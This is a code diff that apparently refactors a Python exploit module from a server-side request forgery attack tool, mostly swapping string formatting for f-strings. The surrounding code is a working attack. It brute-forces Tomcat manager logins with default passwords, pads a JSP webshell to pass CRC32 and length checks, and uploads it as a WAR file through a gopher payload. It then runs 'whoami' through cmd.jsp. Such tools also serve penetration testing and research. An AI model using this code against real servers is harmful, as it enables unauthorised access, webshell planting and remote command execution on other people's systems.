@@ -36,7 +36,7 @@ class exploit():
     tomcat_pass = ["password", "tomcat", "admin", "manager", "role1", "changethis", "changeme", "r00t", "root", "s3cret","Password1", "password1"]
 
     def __init__(self, requester, args):
-        logging.info("Module '{}' launched !".format(name))
+        logging.info(f"Module '{name}' launched !")
         self.args = args
 
         # Using a generator to create the host list
@@ -47,8 +47,8 @@ class exploit():
                     payload = wrapper_http(self.SERVER_TOMCAT, ip, self.SERVER_PORT, usernm=usr, passwd=pss)
                     r = requester.do_request(args.param, payload)
 
-                    if r != None and not "s3cret" in r.text:
-                        logging.info("Found credential \033[32m{}\033[0m:\033[32m{}\033[0m".format(usr, pss))
+                    if r != None and "s3cret" not in r.text:
+                        logging.info(f"Found credential \033[32m{usr}\033[0m:\033[32m{pss}\033[0m")
                         self.SERVER_USER = usr
                         self.SERVER_PASS = pss
 
@@ -59,14 +59,14 @@ class exploit():
                         for i in range(5):
                             payload = self.send_war(i)
                             r = requester.do_request(args.param, payload)
-                            
-                            if args.verbose == True:
-                                logging.info("Generated payload : {}".format(payload))
 
-                            logging.info("Sending CMD to cmd.jsp for padding: {}".format(i))
+                            if args.verbose == True:
+                                logging.info(f"Generated payload : {payload}")
+
+                            logging.info(f"Sending CMD to cmd.jsp for padding: {i}")
                             payload = wrapper_http("cmd/cmd.jsp?cmd=whoami", self.SERVER_HOST, self.SERVER_PORT)
                             r = requester.do_request(args.param, payload)
-                            if r.text != None and r.text != "":
+                            if r.text not in [None, ""]:
                                 logging.info(r.text)
                         break
 
@@ -77,13 +77,13 @@ class exploit():
             webshell_data = self.validate_webshell_length_and_crc32(webshell_data + ' '*padding)
 
             if self.args.verbose == True:
-                logging.info("[+] Creating new zip file: " + self.EXPLOIT_WAR)
+                logging.info(f"[+] Creating new zip file: {self.EXPLOIT_WAR}")
             self.create_war_zip_file(self.EXPLOIT_WAR, self.EXPLOIT_JSP, webshell_data)
 
             if self.args.verbose == True:
                 logging.info("[+] Valid WAR file generated... Creating the gopher payload now...")
             gopher_payload = self.build_gopher_payload()
-            
+
             return wrapper_gopher(gopher_payload, self.SERVER_HOST, self.SERVER_PORT)
 
     def create_war_zip_file(self, war_filename,inputfile,webshell_data):
@@ -99,30 +99,37 @@ class exploit():
         valid_length=0
         valid_crc32=0
         modded_length=0
-        
+
         if self.args.verbose == True:
             logging.info("Original file length: {}".format('{0:0{1}X}'.format(len(webshell_data),8)))
-            logging.info("Original file crc32: {}".format(format(binascii.crc32(webshell_data.encode())& 0xffffffff, 'x')))
-        
+            logging.info(
+                f"Original file crc32: {format(binascii.crc32(webshell_data.encode())& 0xffffffff, 'x')}"
+            )
+
+
+        lead_byte_locations = [0,2,4,6]
         while valid_length == 0 or valid_crc32 == 0:
             crc_string = format(binascii.crc32(webshell_data.encode())& 0xffffffff, 'x')
             ws_len_byte_string = '{0:0{1}X}'.format(len(webshell_data),8)
             valid_length=1
             valid_crc32=1
-            lead_byte_locations = [0,2,4,6]
             for x in lead_byte_locations:
                 try:
-                    if(ws_len_byte_string[x] == '8' or ws_len_byte_string[x] == '9' or crc_string[x] == '8' or crc_string[x] == '9'):    
-                        webshell_data = webshell_data+" "
+                    if (ws_len_byte_string[x] == '8' or ws_len_byte_string[x] == '9' or crc_string[x] == '8' or crc_string[x] == '9'):    
+                        webshell_data = f"{webshell_data} "
                         valid_length = 0
                         valid_crc32 = 0
                         modded_length = modded_length+1
                 except:
                     continue
-        
+
         if modded_length > 0:
             logging.info("The input file CRC32 or file length contained an invalid byte.")
-            logging.info("Length adjustment completed. " + str(modded_length) + " whitespace ' ' chars were added to the webshell input.")
+            logging.info(
+                f"Length adjustment completed. {str(modded_length)}"
+                + " whitespace ' ' chars were added to the webshell input."
+            )
+
             logging.info("New file length: " +'{0:0{1}X}'.format(len(webshell_data),8))
             logging.info("New file crc32: " + format(binascii.crc32(webshell_data.encode())& 0xffffffff, 'x'))
         return webshell_data
@@ -135,8 +142,7 @@ class exploit():
         with open(self.EXPLOIT_WAR, 'rb') as f:
             warfile = f.read()
 
-        headers =  'POST /manager/html/upload HTTP/1.1\r\n'
-        headers += 'Host: {host}:{port}\r\n'
+        headers = 'POST /manager/html/upload HTTP/1.1\r\n' + 'Host: {host}:{port}\r\n'
         headers += 'Content-Type: multipart/form-data; boundary=---------------------------1510321429715549663334762841\r\n'
         headers += 'Content-Length: {contentlength}\r\n'
         headers += 'Authorization: Basic {credential}\r\n'
@@ -145,8 +151,11 @@ class exploit():
         headers += '\r\n'
         headers += '{content_body}'
 
-        content =  '-----------------------------1510321429715549663334762841\r\n'
-        content += 'Content-Disposition: form-data; name="deployWar"; filename="{filename}"\r\n'
+        content = (
+            '-----------------------------1510321429715549663334762841\r\n'
+            + 'Content-Disposition: form-data; name="deployWar"; filename="{filename}"\r\n'
+        )
+
         content += 'Content-Type: application/octet-stream\r\n'
         content += '\r\n'
         content += '{warfile}\r\n'
@@ -157,10 +166,13 @@ class exploit():
             warfile=warfile
             )
         payload = headers.format(
-            host=self.SERVER_HOST, 
-            port=self.SERVER_PORT, 
-            credential=base64.b64encode((self.SERVER_USER + ":" + self.SERVER_PASS).encode()), 
+            host=self.SERVER_HOST,
+            port=self.SERVER_PORT,
+            credential=base64.b64encode(
+                f"{self.SERVER_USER}:{self.SERVER_PASS}".encode()
+            ),
             contentlength=len(content_body),
-            content_body=content_body
-            )
+            content_body=content_body,
+        )
+
         return self.url_encode_all(payload)
